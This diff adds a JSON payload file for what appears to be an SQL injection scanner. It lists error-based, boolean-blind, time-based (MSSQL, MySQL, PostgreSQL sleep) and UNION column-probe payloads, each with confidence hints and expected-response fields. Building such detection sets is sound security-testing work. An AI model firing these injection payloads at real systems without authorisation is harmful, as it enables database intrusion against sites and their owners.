@@ -1,0 +1,27 @@
+{
+  "family": "sqli",
+  "version": "1.0.0",
+  "categories": {
+    "error_based": [
+      {"payload": "'",         "description": "Single quote — déclenche erreur", "confidence_hint": 60},
+      {"payload": "\"",        "description": "Double quote", "confidence_hint": 60},
+      {"payload": "1' OR '1",  "description": "Bypass classique", "confidence_hint": 80}
+    ],
+    "boolean_blind": [
+      {"payload": " AND 1=1-- ", "description": "Condition vraie", "confidence_hint": 90, "expects": "same_as_baseline"},
+      {"payload": " AND 1=2-- ", "description": "Condition fausse", "confidence_hint": 90, "expects": "different_from_baseline"},
+      {"payload": "' AND '1'='1",  "description": "String true",  "confidence_hint": 85, "expects": "same_as_baseline"},
+      {"payload": "' AND '1'='2",  "description": "String false", "confidence_hint": 85, "expects": "different_from_baseline"}
+    ],
+    "time_based": [
+      {"payload": "; WAITFOR DELAY '0:0:5'-- ", "description": "MSSQL sleep 5s",     "confidence_hint": 90, "dbms": "MSSQL"},
+      {"payload": "' OR SLEEP(5)-- ",            "description": "MySQL sleep 5s",     "confidence_hint": 90, "dbms": "MySQL"},
+      {"payload": "; SELECT pg_sleep(5)-- ",     "description": "PostgreSQL sleep",  "confidence_hint": 90, "dbms": "PostgreSQL"}
+    ],
+    "union_based": [
+      {"payload": "' UNION SELECT NULL-- ",                 "description": "Test 1 col", "confidence_hint": 70},
+      {"payload": "' UNION SELECT NULL,NULL-- ",            "description": "Test 2 col", "confidence_hint": 70},
+      {"payload": "' UNION SELECT NULL,NULL,NULL-- ",       "description": "Test 3 col", "confidence_hint": 70}
+    ]
+  }
+}
